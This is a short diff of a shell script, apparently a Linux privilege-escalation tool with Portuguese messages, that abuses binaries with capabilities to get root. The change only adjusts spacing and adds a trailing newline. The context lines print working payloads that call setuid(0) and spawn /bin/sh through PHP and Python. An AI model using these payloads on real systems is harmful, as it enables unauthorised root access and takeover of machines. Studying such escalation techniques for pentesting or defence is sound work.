@@ -41,7 +41,7 @@ echo "$cmd" | while read -r l; do
             CMD="/bin/sh"
             "$pathc" -r "posix_setuid(0); system('$CMD');"
             ;;
-        python | python3)
+        python|python3)
             echo "[+] $pathc → nmap com capabilities! Abrindo modo interativo:"
             "$pathc" -c 'import os; os.setuid(0); os.system("/bin/sh")'
             ;;
@@ -61,3 +61,4 @@ echo "$cmd" | while read -r l; do
             ;;
     esac
 done
+
